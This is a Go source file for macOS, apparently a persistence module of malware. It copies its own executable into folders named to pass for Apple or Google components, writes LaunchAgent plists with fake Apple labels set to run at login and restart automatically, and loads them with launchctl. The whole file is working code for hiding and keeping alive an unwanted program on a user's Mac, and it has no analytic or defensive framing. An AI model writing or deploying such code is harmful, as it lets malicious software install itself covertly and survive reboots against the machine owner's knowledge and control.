//go:build darwin

package persistance

import (
	"fmt"
	"math/rand/v2"
	"os"
	"os/exec"
	"path/filepath"
)

var unsuspectingMacPaths = []struct {
	Path  string
	Label string
}{
	{Path: filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "com.apple.spotlight"), Label: "com.apple.spotlight.index"},
	{Path: filepath.Join(os.Getenv("HOME"), "Library", "Caches", "com.apple.findmy"), Label: "com.apple.findmy.cachedd"},
	{Path: filepath.Join(os.Getenv("HOME"), ".local", "share", "com.google.Chrome.helper"), Label: "com.google.Chrome.analysis"},
	{Path: filepath.Join(os.Getenv("HOME"), "Library", "Preferences", "com.apple.commcenter"), Label: "com.apple.commcenter.vproc"},
	{Path: filepath.Join(os.Getenv("HOME"), "Library", "Logs", "com.apple.cloudd"), Label: "com.apple.cloudd.syncworker"},
}

func copySelf() []byte {
	self, _ := os.Executable()
	data, _ := os.ReadFile(self)
	return data
}

func generatePlist(label, exePath string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`, label, exePath)
}

func Persist() {
	selfData := copySelf()
	var filepaths []int
	filepaths = append(filepaths, rand.IntN(len(unsuspectingMacPaths)))
OuterFor:
	for len(filepaths) < 2 {
		newIdx := rand.IntN(len(unsuspectingMacPaths))
		for _, existing := range filepaths {
			if newIdx == existing {
				continue OuterFor
			}
		}
		filepaths = append(filepaths, newIdx)
	}

	plistFolder := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
	os.MkdirAll(plistFolder, 0755)

	for _, path := range filepaths {
		target := unsuspectingMacPaths[path]
		os.MkdirAll(target.Path, 0755)

		exePath := filepath.Join(target.Path, "com.apple.sys")
		os.WriteFile(exePath, selfData, 0755)

		plistContent := generatePlist(target.Label, exePath)
		plistPath := filepath.Join(plistFolder, target.Label+".plist")
		os.WriteFile(plistPath, []byte(plistContent), 0644)

		exec.Command("launchctl", "load", plistPath).Run()
	}
}
